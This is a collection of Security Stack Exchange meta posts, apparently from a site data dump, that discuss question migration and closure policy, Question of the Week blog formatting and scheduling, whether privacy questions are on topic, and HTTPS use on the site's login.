<p>I'd urge moderators to avoid migrating questions after they've already started to receive a non-trivial number of answers, comments, and votes, as that leads to a situation where pre-migration votes from the original site overwhelm the number of votes that are likely to be cast by our community.  If it is going to be listed on our site, I think we need to have ownership and control over the answers.  Migrating a question after it has already received more than a few votes from the original site prevents us from taking on that kind of control and ownership.  See, e.g., <a href=""https://security.meta.stackexchange.com/q/494/971"">a list of bad migrations I compiled earlier</a>.</p>

<p>If a question already has multiple answers, or has answers with more than a handful of votes, then I would suggest that it not be migrated.  It should either be left on the original site, or the original question should be closed and a new question should be created on our site.</p>

<p>That's the position I'd advocate for.  But I'd like to hear the view of the rest of the community, and of the moderators, too.</p>

<p><strong>The reason I'm bringing this up.</strong>  We had <a href=""https://security.stackexchange.com/q/9286/971"">another dubious migration today</a>.  The migrated question comes here with two answers that already have 26 and 12 votes.  We don't have enough voting members on this site to come anywhere near that; very few questions on this site get anywhere near that many votes from members of our own community.  Thus, at this point, it is a given that votes from the original site are going to overwhelm votes from the IT Security community, for that question.  I don't like having a question and answers listed on the IT Security site, when the votes are overwhelmingly from some other site and when the IT Security community effectively does not have ability to perform quality control of the answers.</p>

For example a question can sometimes be viewed as an attempt to learn how to defeat a security control, or be viewed as a way to achieve other security goals like confidentiality and availability.</p>

<p>For example consider a country that censors information and establishes a firewall which interferes with Internet access in violation of what some would consider <a href=""http://en.wikipedia.org/wiki/Right_to_Internet_access"" rel=""nofollow noreferrer"">human rights</a>, vs an organization or individual in the country which wants to achieve confidential access to the Internet and freedom of information, as perhaps in <a href=""https://security.stackexchange.com/q/10340/453"">this question</a>.

What people tells me implies it doesn't, but I'll give advice on the general topic of closed questions getting deleted. This will hopefully make the specific case here be crystal clear.</p>

<hr>

<p>With the exception of duplicates (which we keep around for searchability), <strong>closing is intended to be a temporary state for a question</strong>. There are only two states in the future of a closed question - getting deleted or getting reopened. The primary purpose of closing is to serve as a sentence to eventual deletion. However, it is not the end of the world, as the closure may be identified as erroneous or the question may be fixed up, resulting in its reopening. </p>

<p>The end takeaway here is that <strong>unless a question has some chance to be considered for reopening, it should be deleted</strong>. Sometimes a question is borderline, or is the subject of an extended discussio of the site's scope. This is about the only time that a question should remain closed for extended periods of time. If the question is definitively out of the site's scope, and there is no business to be had even spending any time arguing to reopen the question, then it is better off to delete the question. Otherwise, you are leaving an avenue to reopen elements that you do not believe should ever be reopened.</p>

<hr>

<p>It is often spoken of that a closed off-topic question could be left on the site ""as an example of what doesn't belong"". This sounds great on paper, but in practice it doesn't work out. Recall the earlier point about duplicates - closed questions are still entrances to the site. Keeping junk you do not want means that people who are looking for said junk will end up finding your site. Most of the time, you do not want that.</p>

<p>The other salvaging point one might look at is the answers on the question. An excellent answer may protect a pretty horrible question, that's after all why we have the Reversal badge. However, ask yourself when looking at a closed question with a great answer, ""does the answer salvage the question to the point it <em>shouldn't</em> be closed?"" It is unfortunate that a great answer may be lost due to being in the wrong place, but you shouldn't spare the world's greatest turkey recipe just because someone asked how to keep his dinner safe from ravenous relatives. Your business as a site is to host information related to the scope you set - the great and wonderful content on your site should reflect your scope and not what is outside of it.</p>

684,1,2012-01-27T18:28:44.667,8,141,"<p>This bit is driving me crazy, and I finally figured out what the source of the problem was: The default link color in the security site is a fairly light faded blue (#3D85B0) making links less visible, while <em>visited</em> links are visibly higher saturation and higher contrast against the background (#1b608a), making them <em>more</em> visible than unvisited links.</p>

<p>The end result is that new questions are effectively ""greyed out"" and less visible in comparison to old questions. That is, the when you visually scan the list of questions, the questions that you have already visited stand out, while the new ones fade into the background.</p>

<p>This is backwards. The question you haven't seen yet, the new ones, should draw your attention. This is the way all the other stackexchange sites work. </p>

<p>When I'm on this site I find myself returning to questions I've already answered and missing questions I haven't seen yet because the visual cues are counter-intuitive.</p>

Under the former presumption, I'd like to suggest that we put some proposals here.  I'm not aware of whether or not the communities actually get to choose their Easter egg, but I figured we could at least make sure there's some input available for whenever SEI decides to give us one.</p>

<p>So, what Easter egg would you like to see?  Only one suggestion per answer, please, to allow for voting to be accurate.</p>

705,2,2012-02-05T16:13:48.747,10,,"<h3>Rationale: why do we close questions?</h3>

<p>There are really two ways to do moderation. If you've been on any of the <code>.moderated</code> newsgroups you'll be well aware that to get a post on there, it needs to undergo a review process first and be accepted. The aim is to keep problem discussions from arising.</p>

<p>SE is slightly different - it works the other  way. <em>Anyone</em> can ask a question on SE and closing a question is the equivalent of putting that question <em>back into review/improve mode</em>. It's a feedback mechanism designed to react to problem cases only, so the usual business of asking and answering good questions can just... <em>happen</em>.</p>

<h3>Why do we close a question?</h3>

<p>The philosophy of SE is that each site handles questions on <em>problems you face</em> or things you are trying to understand. The <a href=""https://security.stackexchange.com/help/dont-ask"">don't ask</a> section of the help center gives you a good overview of things that don't work - to summarise:</p>

<ul>
<li>Some questions invite arguments or extended debate that suck up time when members could be helping other people.</li>
<li>Some questions are too broad, too narrow or have other content problems.</li>
<li>Some questions belong elsewhere.</li>
</ul>

<p>These have been worked out over time and with a lot of experience from Stack Overflow and are, <em>broadly speaking</em> true. Sometimes, exceptions are made - it is always a case-by-case thing.</p>

<h3>Is closing like deletion?</h3>

<p>No. Actually, deletion is a different concept on SE. Closed questions are put ""into improve mode"" if you like, and are still visible for <em>anyone</em> to improve. That's the idea. Deleted questions are different — they have a red background and are invisible to all but high reputation users. So deletion is different and solves a slightly different problem.</p>

<h3>What are the requirements for closing a question?</h3>

<p>If you have 3000 reputation, or 500 reputation on a beta site, you can vote to close any question for the reasons above. More on that in a moment.</p>

<p>If you do not have this level of reputation, you will find that under the flag menu, you have an option ""this question does not belong here"". That will raise a flag for users who can vote to close.</p>

<h3>Why can anyone vote to close/reopen?</h3>

<p>Firstly, anyone with sufficient reputation can vote to close or reopen (or flag as such, with lower reputation) because it is <em>your site</em>. This is really important - it's about expressing what you feel works and doesn't.</p>

<h3>Ok, so how does it work?</h3>

<p><img src=""https://i.stack.imgur.com/qogGL.png"" alt=""Example close button""></p>

<p>Ok, the important piece. Voting to close works like this:</p>

<ul>
<li>Underneath the question, there will be a close link. When you click on this, you will be presented with a list of options from which you can pick a close reason most appropriate to the situation.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/THms0.png"" alt=""Close vote reasons dialog""></p>

<ul>
<li>If other people have voted, you will see blue numbers against the reason they chose.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/69Kak.png"" alt=""Other votes""></p>

<ul>
<li>The exact duplicate page takes you to a page that allows you to specify a question to close as an exact duplicate against.</li>
<li>The ""off topic"" page will present you with two options - one to migrate here, to meta, and one just off topic. At the moment, only moderators can send questions elsewhere, so feel free to cast a vote here and flag if you have a target in mind - we are collecting statistics to build a ""migrate to"" list, but that is not implemented yet.</li>
<li>The other options are straight out closes.</li>
<li>Once you pick your option and click ""close"", your vote is registered. You cannot retract it at this stage, but nobody else, including moderators, will know it was you who voted.</li>
<li>If five people agree, the question will be closed. You've seen the effect of these before.</li>
<li>Your name, and the name of other closers, will appear on the bottom of the question.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/K3F4V.png"" alt=""Close banner""></p>

<h3>How does vote to re-open work?</h3>

<p>A closed question has a ""reopen"" link underneath it. If you click this, a dialog box will ask you if you are sure - click yes and your vote will be registered to re-open the question.</p>

<p>Below, you can see an example of the re-open link with two votes registered for re-opening (out of five).</p>

<p><img src=""https://i.stack.imgur.com/syw4O.png"" alt=""Re-open link""></p>

<h3>What happens if I make a mistake?</h3>

<p>Don't worry! You can retract your close vote by clicking the “close” button again. This is useful, for example, if the question has been edited since you voted to close. Note that you cannot use this to change the close reason (if you retract a close vote, you can't cast a new one).</p>

<p>Furthermore, unless five people agree, or a moderator agrees, the question won't be closed. </p>

<h3>Why are some questions closed with fewer votes?</h3>

<p>Moderator close votes complete the required vote count immediately, no matter how many people have voted. This applies for both close/reopen votes.</p>

<p>Furthermore, closure as duplicate can be faster for two reasons. If the asker agrees that their question is a duplicate, they can validate the closure immediately. This shows a final duplicate close vote from “Community”. Also, if a user with a gold tag badge in one of the question's initial tags votes to close or reopen as a duplicate, this takes effect immediately; in this case a gold tag badge icon appears after the closer's name.</p>

<h3>I've seen a closed question and I disagree. What can I do?</h3>

<p>Well, one option is to use your re-open vote! You can also always raise a discussion here on meta to seek clarification on why a question is closed and hopefully either a resolution will be reached, or you will get an explanation for the closure. </p>

<h3>My name appears on the bottom. Isn't this going to cause problems with other users?</h3>

<p>Actually, surprisingly few closed questions generate any response at all.</p>

<p>However, if you experience difficulties as a result of closing a question, you can and should contact a moderator via the flag mechanism (which is anonymous). We can then take any necessary action.</p>

<h3>How do I find questions I might need to close? What about re-opens?</h3>

<p>In the <a href=""https://security.stackexchange.com/review"">review queues</a>, specifically the <a href=""https://security.stackexchange.com/review/close"">close votes queue</a> and the <a href=""https://security.stackexchange.com/review/reopen"">reopen votes queue</a>. These queues are open to everyone who has the close vote privilege. For each question, you get to decide whether to close/reopen or not; enough “no” votes take the question out of the queue. An edit from the queue is a vote to not close or reopen.</p>

<p>That question got migrated from StackOverflow.  At the time it was migrated, it already had multiple answers, some of them with many votes.  Unfortunately, some of the highly-voted answers have advice of debateable merit.  This is not ideal, because StackOverflow has many more voters than IT Security does, and it means our community is outvoted by folks who aren't even a member of our community.  This makes it infeasible for our community to take responsibility for the accuracy of the page for others who may find it on our site in the future, which is an unfortunate side effect of migration.  </p>

<p>Also problematic about this migration is that similar questions have been asked before on this site and have been answered in depth.  The migrated question is basically a duplicate.  Unfortunately the poster of this question and some of the answerers seem to be unaware of the state of the art or the good material that is already available on this site about this topic.</p>

<p>Of course there will always be situations where we have inaccurate, low-quality, or duplicative questions and answers on our site, but I think we should try to avoid the avoidable ones.  (And I should say I have no beef with migration in general; I think it's great that moderators looking out for questions that might be better-suited to our site.  I would just prefer that they followed <a href=""https://security.meta.stackexchange.com/q/628/971"">our criteria</a> before migrating.)</p>

<p>I have written <a href=""https://security.meta.stackexchange.com/q/494/971"">before</a> about <a href=""https://security.meta.stackexchange.com/q/628/971"">bad migrations</a> of this sort, but the recurrence suggests to me we don't yet have this licked.  Do others agree that this is undesirable?  If they do, what can we do to prevent repeat occurrences?</p>

<p>P.S. My goal is not to call out people for blame, but rather to ask for constructive suggestions about how we can maximize the quality of this site going forward.</p>

<p>So I discussed this with mods before it was migrated over as I agreed it should be here. I didn't see it as a duplicate (similar, yes, but not a full dupe) but if you do think it is, please vote to close as dupe. Enough votes and it will get closed as one.</p>

<p>If something is offtopic elsewhere and ontopic here it <strong>still</strong> makes sense to migrate it and then close or merge.</p>

<p>Usually we do get to discuss before questions are migrated over. Sometimes not, but that is fine in most cases. We can always close, merge, delete if necessary. The only problem is when there are higher votes than those we can generate here, and as @Iszi mentioned in the comment above, there is an ongoing request for vote reset on migration, but we have no update as yet.</p>

Or what about questions without selected answer, but one clearly answers the topic? Could a moderator pick a good answer for the future reference of people, and that would help cut down on our unanswered questions?

730,1,2012-03-16T16:16:58.450,3,65,"<p>A suggestion for those who write the blog posts (as I am currently just a humble editor):</p>

<p>I think it would be a good idea to create a ""template"" post for Question of the Week posts, and any other sorts of posts that are done on a regular basis.  I was viewing the old QotW posts, and found a lot of inconsistency in their formatting.  I've fixed the title and tag issues, but I'm sure there's some other cleanup that could be done.</p>

<p>Some of the things I've noticed:</p>

<ul>
<li>QotW inconsistently capitalized:  Sometimes it's <code>QotW</code>, sometimes <code>QOTW</code>, and one or two had it as <code>QoTW</code>.</li>
<li>Pound sign inconsistently used:  Sometimes it would be <code>QotW XX</code>, sometimes <code>QotW #XX</code>.</li>
<li>Inconsistent separator between QotW number and title:  Sometimes <code>QotW #XX - Title</code>, others <code>QotW #XX: Title</code>, and some even just <code>QotW #XX Title</code>.</li>
<li>Inconsistent usage of the <a href=""https://security.stackexchange.com/questions/tagged/qotw"" class=""post-tag"" title=""show questions tagged &#39;qotw&#39;"" rel=""tag"">qotw</a> tag:  Some used it, some didn't.</li>
<li>Some QotWs occasionally do not include a link to the question itself.  Usually, this is spotted and fixed shortly after the post goes live but it has been a recurring issue.</li>
<li>Inconsistent formatting of the post body.</li>
<li>Inconsistent usage of the question title as the blog post title.  This is obviously going to be an issue where the QotW is actually a post about multiple questions, and that's fine.  In single-question cases though, the blog post title doesn't always match the question title.</li>
</ul>

<p>As I've said, most of the title and tagging issues have been polished by now. However, these and the rest of the inconsistencies should be prevented in the future by use of a template.  Some suggestions for the template:</p>

<ul>
<li>Title format:  <code>QotW #XX:  Title</code>.  Example, from #20:  <code>QotW #20: Are Powerline ethernet adapters inherently secure?</code></li>
<li>All QotW posts should be tagged with <a href=""https://security.stackexchange.com/questions/tagged/qotw"" class=""post-tag"" title=""show questions tagged &#39;qotw&#39;"" rel=""tag"">qotw</a>.

<ul>
<li>We may want to consider changing this to a Category.</li>
</ul></li>
<li>Posts should include some canned text at the bottom, telling users how they can propose a QotW (link to a search for meta questions tagged QotW, sorted by ""newest"" - make sure there's a thread started for the next week first).

<ul>
<li>This link is to a search for meta questions tagged <a href=""https://security.stackexchange.com/questions/tagged/qotw"" class=""post-tag"" title=""show questions tagged &#39;qotw&#39;"" rel=""tag"">qotw</a>,<a href=""https://security.stackexchange.com/questions/tagged/blog"" class=""post-tag"" title=""show questions tagged &#39;blog&#39;"" rel=""tag"">blog</a>,and <a href=""https://security.stackexchange.com/questions/tagged/featured"" class=""post-tag"" title=""show questions tagged &#39;featured&#39;"" rel=""tag"">featured</a>.  <a href=""https://security.meta.stackexchange.com/questions/tagged/qotw+featured+blog"">https://security.meta.stackexchange.com/questions/tagged/qotw+featured+blog</a>  If the next week's <a href=""https://security.stackexchange.com/questions/tagged/qotw"" class=""post-tag"" title=""show questions tagged &#39;qotw&#39;"" rel=""tag"">qotw</a> thread is the only one which is also tagged <a href=""https://security.stackexchange.com/questions/tagged/featured"" class=""post-tag"" title=""show questions tagged &#39;featured&#39;"" rel=""tag"">featured</a>, then the link should point users to the right place.</li>
</ul></li>
<li>Closing text should also include an invite to participate in the site in general, and/or the featured question.</li>
<li>Formatting and layout of the body should be more standardized.</li>
<li>For single-question QotW posts, the post's title should match the question's title - and the question's title should be edited to be blog-presentable, if necessary.</li>
</ul>

<p>I think this will help make our blog look more professional and inviting, as well as make things easier for those who actually have to write the QotW posts.</p>

737,2,2012-03-19T08:58:01.170,6,,"<p>Well, I'm a crypto mod and here's my take, bearing in mind I have an interest in promoting crypto:</p>

<p>Don't migrate old questions.</p>

<p>Really. There's no point in moving questions around just because right now they fit the scope of one site or another better. They were on topic here at the time, the OP has either had a resolution to their question or not checked back to see the outcome; either way, we're all done with those questions and unless there is a major reason to dig them up and improve them, we can leave them around for others to read at their leisure.</p>

<p>On a purely practical note, retagging 400 questions is not my idea of a fun weekend. Whilst I think the influx of questions would make crypto look good, it'd be a huge cleanup operation.</p>

<p>One of the things I took out of the recent firestorm on Stack Overflow r.e. closing and moving old questions was that actually we should judge a question on the answers it has - not purely on the question. The <a href=""http://blog.stackoverflow.com/2012/03/se-podcast-32-jarrod-dixon-and-josh-heyer/"">podcast</a> for SE discusses this idea in unlimited amounts of detail.</p>

<p>The same applies to crypto vs security for a crypto question. It isn't about defining an ontology and moving crypto questions to crypto.se - it's about the answers you'll get:</p>

<ul>
<li>On Security.SE you're expecting a best-practices security-focused what-should-I-do-to-be-safe answer. If you ask about inventing your own crypto, you'll politely be told not to do that and instead directed to one of the many freely available crypto libraries, recommended reading, previous questions etc.</li>
<li>If you ask on crypto, you'll get a detailed explanation of the various pitfalls of your scheme, with reference to relevant results.</li>
</ul>

<p>Another practical problem of migrating all these questions is that many of them have answers in the former category, not the latter.</p>

<p>Finally, if there's a crypto question here on security that is harmful to the internet in its content, that can easily be fixed by existing mechanisms we have for that kind of thing - in increasing order of severity comments, downvotes, closing, deletion, whichever applies (the idea being we'd hopefully educate the poster along the way so that they fix the issue, whatever it is :)).</p>

738,2,2012-03-19T14:04:21.980,1,,"<p>I am a fan of ""compendium of knowledge"" and see value in moving high value/point questions to the appropriate site.  I also see your point on how it can be confusing.  There is overlap, and there isn't a hard and fast rule.</p>

<p>On the other hand, questions with false, misleading information should be closed on the appropriate site with a link to the most relevant answer on the correct site.  This will prevent a site like Stackoverflow from overwhelming a smaller niche site such as cryptography.  An uninformed reader may follow the advice of the highest voted question, and do things the wrong way.  That is a loss for them and a loss for the SE community.</p>

<p>Finally, I think that questions with low votes, low views should be migrated according to user demand. Any time a question is touched (edits, rewrites, or especially mod flag) then they should be re-tagged accordingly.  The retagging process is a pain, so perhaps the flagger should include new proposed tags as well.</p>

<p>This is my perspective so far:</p>

<ul>
<li>SO - for programming, language specific implementations</li>
<li>Sec.SE - for all engineering, network, security admin and corporate policy questions </li>
<li>Crypto - for issues dealing with crypto mechanics or implementation variances in various libraries/etc.  Some Math questions here</li>
<li>Math.SE - for deeper math questions that are more theoretical than Crypto's scope </li>
</ul>

The reason being that all privacy questions could already be answered in the <a href=""https://security.stackexchange.com/"">IT security</a> SE. User Gilles wrote this about IT security:</p>

<blockquote>
  <p>In spite of the name (which was fixed in stone at the beginning of the
  site), IT Security is more generally about information security, so
  that does include privacy.</p>
</blockquote>

<p>Is this true? (I haven't been able to conclusively determine that myself, so i would like to know what the experts think.) Has IT security evolved into a SE about information security?</p>

<p>And a followup question: will anyone with a question about (any aspect of) privacy be able to ask it on the IT security SE and get a good answer? Even if the privacy question doesn't relate to the IT or security side of privacy?</p>

742,2,2012-03-20T12:14:56.053,8,,"<p>Absolutely.   </p>

<p>While I agree that Privacy is not equivalent with Security (and please, ignore the ""IT"" part of it, that was locked in at the beginning, and really only intends to convey the ""professional"" aspect), you should realize that one of the responsibilities of Security, is protecting that Privacy.<br>
As @Gilles has commented on the proposal several times, Privacy is really about protecting the confidentiality (security) of certain personal information. While I would say that Privacy does go a bit further than that, it is still the core.   </p>

<p>I also want to point out that in common SDL (Security Development Lifecycle) frameworks, there are quite a bit of Privacy requirements. In Microsoft's SDL, almost half (!) is privacy oriented - most Security chapters have a parallel Privacy chapter. Two sides of the same coin.   </p>

<p>In any event, of the 8 proposed questions on the proposal so far, almost all would be clearly ontopic here. The only hesitation I would have is the purely legal ones, that <em>could kinda</em> be ontopic here, but could not be safely answered without the big honkin' IANAL disclaimer.<br>
But that would be that case with a standalone Privacy proposal, too.   </p>

743,2,2012-03-20T14:01:46.857,5,,"<p>We ended up having this conversation, primarily in the chat room, during the time that the site graduated from beta. Unfortunately, this was a bit too late since all of the branding and design had been finished, all of which included the dreaded 'T'. </p>

<p>While many of us (most?) on the site came out of an IT background, the industry as a whole has shifted more towards focusing on the information and less on the storage media.  For example, while I am a highly technical person who primarily deals with IT related stuff, I like to tell people, </p>

<blockquote>
  <p>I'm concerned with the data. I don't care if it's in a file server, or
  a file cabinet. Both need to be protected, and both are in scope.</p>
</blockquote>

<p>One of the guiding principles of the discipline is the notion of CIA -- Confidentiality, Integrity, and Availability. Our goal is to make sure all three are met as well as possible. That is, nobody has access to data that they shouldn't (C), the data is correct (I), and whose who need the data can reasonably get it (A). Your question about Privacy fits in with the Confidentiality aspect. Let's not forget that a privacy is a central function to many legislative and industry compliances that we are in the business of handling. Just to name a few we have FERPA, HIPAA, and PCI-DSS (the size and makeup of this list varies widely depending on <em>your</em> industry), but all 3 of those have Confidentiality (privacy) components.</p>

<p>More specifically, to TSA related questions that Avi brought up, you'll find that many Information Security experts regularly discuss such matters. </p>

744,1,2012-03-21T18:17:29.590,2,61,"<p>I had some thoughts for improving our QotW process, in terms of timeline.</p>

<p>Currently, the timeline is:</p>

<ul>
<li>Question selection:  ASAP (Relative to posting of QotW meta question)</li>
<li>Author selection:  Midday Thursday</li>
<li>Draft available for review:  End of Thursday</li>
<li>Publish:  Friday</li>
</ul>

<p>I think we could benefit from a few things, here.  Firstly, make sure the next QotW meta thread goes up on the same day as the current QotW post.  Then, we can spread this timeline out a bit further so we enable the author more time to write a good post, and have ample time for reviewers to check it before publication.  Lastly, it might be a good idea to standardize the definitions of terms like ""Midday"" and ""End of"" so that everyone is on the same page as to exactly when the next step needs to happen.</p>

<p>I'll post my ideas for this in an answer here.  What are your thoughts?</p>

<p>1.)  New schedule:</p>

<ul>
<li>QotW meta post for next week:  Same day as QotW blog post for this week.</li>
<li>Question <em>and</em> author selection:  End of Tuesday
<ul>
<li>These really are, to an extent, co-dependent.  Especially in cases where questions of varying subject matter have equal votes.</li>
</ul></li>
<li>Draft submission:  Thursday morning.
<ul>
<li>Draft should be reviewed by at least one person prior to publication.</li>
</ul></li>
<li>Publication:  Between morning &amp; midday, Friday.</li>
<li>Repeat</li>
</ul>

<p>2.) Standardization of time expectations:</p>

<ul>
<li>A time zone should be selected.  I suggest either GMT/UTC or U.S. Eastern.</li>
<li>""Morning"" deadlines will be 0800</li>
<li>""Midday"" deadlines will be 1200</li>
<li>""End of"" deadlines will be 1700</li>
</ul>

<p>Some particular advantages here, just from the schedule modifications:</p>

<ul>
<li>Posting the QotW meta at the same time as the previous blog entry gives more time for question selection.</li>
<li>This schedule allows a full day, and then some, for authors to finalize their draft.
<ul>
<li>Current schedule only guarantees about a half-day.</li>

<blockquote>
  <p>Formatting and layout of the body should be more standardized.</p>
</blockquote>

<p>On this one, I am not saying that I disagree but I may not 100% agree with every position in the sentence (that's a politicians way of saying: no). I think some standardization is important, but not too much. My English teacher used to lecture us about remembering our audience and our purpose. Our audience is obviously security-types; however our purpose? Standard purposes were:</p>

<ul>
<li>Entertain.</li>
<li>Inform.</li>
<li>Persuade.</li>
</ul>

<p>What's the ultimate goal of the blog? To attract people here, generate a strong community, attract more people to the blog and son on. Qotw 7 was about stuff, Ninefingers wrote an essay, Thomas wrote a shorter and better essay is a bit too informative and veers on boring. We need some space to entertain, which is why I was slightly(1) excited to do the satellites question.</p>

<p>Don't get me wrong, we need to remain professional and I'm probably guilty of not being, sometimes, but just provided we're not following a script/writing press releases, I'm good.</p>

<p>Anyway, thank you for bringing organisation to my chaos. Feel free to beat me with a stick when I inevitably forget all of this.</p>

<p>(1): Oh ok, very.</p>

<li>The top voted answer in detail - its themes and conclusions.</li>

The ""login"" screen, such as it is, is really just a referral to your <a href=""http://en.wikipedia.org/wiki/OpenId"" rel=""nofollow noreferrer"">OpenId</a> provider. You submit your password (or any other authentication credential) to them, not the SE site.    </p>

<p>That said, SE does have its own OpenId provider, and I believe that the actual authentication process <em>is</em> encrypted over HTTPS. It works just like any other potential provider, and simply redirects back to the SE site.   </p>

767,2,2012-04-09T13:49:32.887,3,,"<p>Regarding the login process itself, there are a couple of issues:</p>

<ul>
<li>If you use an external OpenID provider (e.g. Google), whether-or-not HTTPS is used will depend on the provider. The four providers with a big icon (Google, Yahoo, MyOpenID and Facebook) use HTTPS pages.</li>
<li>If you use the StackExchange login, it's also using HTTPS, but via asynchronous calls, within a div/iframe, which is useless (as <a href=""https://stackoverflow.com/a/3183176/372643"">detailed here</a>), since the user has no way of verifying that it is using HTTPS indeed. That's quite bad actually (or pointless).</li>
</ul>

<p>As a general rule, when using HTTPS: always make this clear to the user, so that the user can check (a) that HTTPS is used and (b) that it is used with the site they expect (I've used Chrome's developer tools to find out that it was making HTTPS requests via asynchronous requests, not something that most users would do). This means that the main URL in the browser should be using <code>https://</code> and the domain should be the one relevant for that particular part of the process. A bad example of this second point is <a href=""http://en.wikipedia.org/wiki/3-D_Secure"" rel=""nofollow noreferrer"">3-D secure</a>, whereby the bank's address is often embedded on the page, still using the merchant's address in the top bar.</p>

It would be nice if they let you choose to go to an https site, or at the very least had an option to only send/receive secure cookies for an account (SSL only) to eliminate firesheep style attacks; but they don't.  The stated reason is extra CPU cost for millions of monthly visitors.  Its a free service and widespread impersonation due to stolen cookies doesn't seem to have become a problem, yet.</p>

772,2,2012-04-15T21:08:51.620,4,,"<p>So, your question has been closed. Seems a bit harsh? Ok, well, this guide is here to help explain <em>why</em> your question has been closed. This has been covered briefly <a href=""https://security.stackexchange.com/faq#close"">in the FAQ</a> too.</p>

<p><strong>Is closure permanent?</strong></p>

<p>Absolutely not. Closed questions are only prevented from receiving additional answers; they're even still visible to all members of the site.</p>

<p>This might sound like a bad thing - it isn't. The concept of closure is that we prevent answers coming in that make guesses or assumptions based on an incomplete question, or are just plain bad, <em>until</em> the question has been improved. We are all about quality and question closure is out way to ensure users spend their time generating quality answers.</p>

<p><strong>Does a closed question count against me?</strong></p>

<p>Not in a reputation sense (unless you have also been downvoted). However, if a sufficient number of your questions are closed, the system may automatically ban you from asking additional questions. Similarly, a moderator may take action before then.</p>

<p>If a moderator takes action, they will likely contact you, explain the problem and what you need to do to improve. Take note and all should be fine.</p>

<p>If the system takes action, you will receive an orange bar notification. Moderators have no way to tell if you have been banned from asking questions via this mechanism and we cannot lift it, either. You will have to have had a sufficient quantity of questions closed to trigger this, however.</p>

<p><strong>Ok, so why was my question closed?</strong></p>

<p>Underneath each question, there is a banner which explains why your question was closed, giving a few short reasons. Here, I will expand on these:</p>

<ul>
<li>Exact duplicate - this type of closure is exactly what it sounds. We already have a question covering that material and it would be better if the material is to be revisited for those answers to be edited and improved on, rather than creating a whole set of duplicate answers.</li>
<li>Not constructive - some questions are just not suited to the format we use here. These include lists, polling or opinion questions that eat up the time of our members, who are here to help people with their problems and learn about security in a constructive, problem-by-problem manner.</li>
<li>Not a real question - questions closed as NARQ fit into two categories; the first is that your question simply doesn't make sense or is so poorly worded it's almost a crime people are reading it. The second is that your question, whilst valid, is just too broad to be covered over the internet and really needs to be broken into manageable chunks.</li>
<li>Too localized - questions closed with this reason refer to a very narrow scenario, or are, for example, only useful to you and in no way would be useful to other people with the same problem.</li>
</ul>

<p><strong>What about off topic questions?</strong></p>

<p>Sometimes, a question is good, but just doesn't fit here on security. In this case two things will happen:</p>

<ul>
<li>The question will be migrated to another Stack Exchange site.</li>
<li>The question will be closed as purely off topic.</li>
</ul>

<p>Migration is a privilege, not a right. If your question has been migrated, a moderator has gone to the effort to get it moved; however, there is no onus on us to migrate questions anywhere. If your question is poorly formatted, we are unlikely to move it.</p>

<p><strong>How do I get my question re-opened?</strong></p>

<p>Occasionally, questions are closed by mistake. This is a rare occurrence and will usually be rectified pretty quickly when we realise this has happened.</p>

<p>Here is a list of steps you can take to get your question improved and increase your chances of re-opening:</p>

<ol>
<li>Read about what questions are <a href=""https://security.stackexchange.com/faq#questions"">on topic</a> and <a href=""https://security.stackexchange.com/faq#dontask"">off topic</a> in the FAQ.</li>
<li>Decide if your question was really a fit for SE in the first place. Not all questions are. However, you may well be able to re-word it into such a way that it <em>does</em> fit. Do have a ready of point 3:</li>
<li>Work through each of the articles on the <a href=""https://security.stackexchange.com/questions/how-to-ask"">how to ask</a> page. Specifically, I would highlight the following:

<ul>
<li>Is your question properly formatted?</li>
<li>Have you checked your spelling and punctuation?</li>
<li>Have you explained your problem sufficiently?</li>
</ul></li>
<li><p>Underneath your question there is an edit link:</p>

<p><img src=""https://i.stack.imgur.com/T9Z3Y.png"" alt=""Screenshot of edit link""></p>

<p>Use this to improve your question. <strong>Take your time</strong> and ensure you put sufficient effort in. </p></li>
<li><p>When you are sure you have edited the question and framed it in the best possible way, you may do one of the following:</p>

<ul>
<li>Contact us in the DMZ <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">(security chat room)</a> or <a href=""http://chat.stackexchange.com/rooms/2691/the-assembly"">the assembly</a>. Users capable of re-opening are not always around, but it may help to ask for feedback and get other user's opinions.</li>
<li><p>A moderator should have commented on your answer. You can reply to them using the following format:</p>

<pre><code>@moderator_name Hello, I've edited my question, can 
you please let me know if it is suitable for re-opening?
</code></pre></li>
<li><p>Alternatively, you can flag for moderator attention using the flag link underneath your question and filling out the custom reason box:</p></li>

<p>Please critique the question.  If you believe it has violated any rules, please cite the rule that it violates, with a citation or link to the rule.</p>

<p>One person mentioned they believe that my request for ""one piece of software per answer"" violates the StackExchange rules.  I've researched the rules, and as best as I can tell, I have not found any rule that it violates.  I also believe the format is better for the community -- or, at least, that some deference should be provided to the question-asker when there is no clear reason to object to it.</p>

<p>I've <a href=""https://security.stackexchange.com/faq#dontask"">read the faq</a>, and I don't see anything in the FAQ that this violates.  This is <a href=""https://security.stackexchange.com/questions/89/feeding-dev-random-entropy-pool/207#comment22560_207"">an actual problem</a> to be solved; it is not open-ended or hypothetical; it is not a rant; my answer is not provided along with the question; and not all answers are equally valid.  Indeed, some answers may be more useful to people than others.  Also, some answers may be more accurate than others.  For these reasons, I think it is useful to be able to vote separately on each answer, or to downvote those answers that are incorrect.</p>

<p>I understand that questions like ""Can you provide a list of all books on computer security?"" are not a good fit for our community, because they are too subjective.  This sometimes is summarized by saying Infinite List of X questions are bad.  However I don't think those criticisms apply to this particular question.</p>

<p>Is this an <a href=""https://meta.stackexchange.com/q/57226"">Infinite List of X</a> question?  The term is frankly not defined, except by example, so I don't think it makes sense to mindlessly dismiss my question as Infinite List of X.  Instead, we have to look at the examples and the arguments given why Infinite List of X questions are bad.  Typically, the criticisms mention polls or surveys, which are indeed problematic; but I don't think they are analogous to my question.  One reason sometimes given why Infinite List of X questions are bad is that ""every answer is equally valid"" or ""there are zero meaningful criteria for evaluation""; I don't think that applies to my question, as explained above.  Another criticism that's mentioned is that these questions are often ""copy-pasted content, not original contributions"", but that's not relevant to my question.</p>

<p>Discussion?</p>

<p>Should the question and all answers be deleted entirely?  Would it be better to not have the information on this site, than to have it in this format?</p>

<p><strong>Added 5/1:</strong> Well, that was fast.  11 hours after this question was posted, my answers were forcibly edited to merge them (without my permission), and my question was edited to change it.  So I guess that means this discussion topic is now closed, and the community has spoken.  Got it.</p>

<p>I would have liked the chance to respond to some of the latest comments in this discussion, but I guess that's now irrelevant.  (And I'll point out that still no one has cited any rule that my original question violated.)  Oh well.</p>

